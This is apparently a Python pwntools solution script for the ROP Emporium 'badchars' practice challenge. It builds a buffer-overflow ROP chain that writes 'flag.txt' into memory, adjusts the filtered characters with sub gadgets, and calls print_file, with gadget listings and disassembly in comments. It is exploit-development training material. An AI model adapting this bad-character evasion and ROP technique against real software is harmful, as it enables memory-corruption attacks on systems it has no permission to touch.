from pwn import ELF, process, packing, ROP, context
context.log_level = 'critical'

# pseudo code
'''
ROPgadget.py --binary badchars --ropchain

        [+] Gadget found: 0x400634 mov qword ptr [r13], r12 ; ret
        [+] Gadget found: 0x40069e pop r13 ; pop r14 ; pop r15 ; ret
        [+] Gadget found: 0x40069c pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

   0x0000000000400628 <+0>:     xor    BYTE PTR [r15],r14b
   0x000000000040062b <+3>:     ret
   0x000000000040062c <+4>:     add    BYTE PTR [r15],r14b
   0x000000000040062f <+7>:     ret
   0x0000000000400630 <+8>:     sub    BYTE PTR [r15],r14b
   0x0000000000400633 <+11>:    ret
   0x0000000000400634 <+12>:    mov    QWORD PTR [r13+0x0],r12
   0x0000000000400638 <+16>:    ret
   0x0000000000400639 <+17>:    nop    DWORD PTR [rax+0x0]
'''

data_section_start = 0x601038                   #need to write to .bss b/c we can only write 6 bytes to .data
POP_R12_POP_R13_POP_R14_POP_R15_RET = 0x40069c
POP_R13_POP_R14_POP_R15_RET = 0x40069e
MOV_R13_R12 = 0x400634
POP_RDI_RET = 0x4006a3
PRINT_FILE = 0x400510
ADD_R15_R14 = 0x40062c
SUB_R15_R14 = 0x400630

#filename = [b"f", b"l", b"a", b"g", b".", b"t", b"x", b"t"]
#filename = [0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74]    #the intended hex values
filename = [0x66, 0x6c, 0x62, 0x68, 0x2f, 0x74, 0x79, 0x74]  #set the bad char hex values (a,g,'.'), 1 greater than what they should be
                                                             #this allows us to then sub 1 from them after they are placed
                                                             #setting 'x' to 0x74 allows us to add 4 to get it to x

# i initially attempted to first set the characters to a value and then alter them with a separate pop r13, pop r14 etc.. however the chain gets too long and
# starts to eat into the environment variables so i store all of the necessary alterations in r14 and r15 while also setting the initial write values to r12 and r13. then i call
# sub or just plain mov depending on which type of char it is (bad or not)                                                           
rop = b"A" * 40
for i in range (0,8):
    rop += packing.p64(POP_R12_POP_R13_POP_R14_POP_R15_RET) #gadget to load r12 -> char, r13 -> location in .data
    rop += packing.p64(filename[i])                         #letter of filename
    rop += packing.p64(data_section_start + i)              #location in .data
    if i in (2,3,4,6):                                   #handle chars 'a', 'g', '.'
        rop += packing.p64(0x1)
        rop += packing.p64(data_section_start + i)
        rop += packing.p64(MOV_R13_R12)                         #dereference r13, writing char to .data
        rop += packing.p64(SUB_R15_R14)
    else:
        rop += packing.p64(0x0)                                 #r14
        rop += packing.p64(0x0)                                 #r15
        rop += packing.p64(MOV_R13_R12)                         #dereference r13, writing char to .data

print('\ncalling print_file...\n')
# call print_file
rop += packing.p64(POP_RDI_RET)
rop += packing.p64(data_section_start)
rop += packing.p64(PRINT_FILE)

e = ELF("badchars")
p = process(e.path)
p.recvuntil("> ")
p.send(rop)
p.interactive()

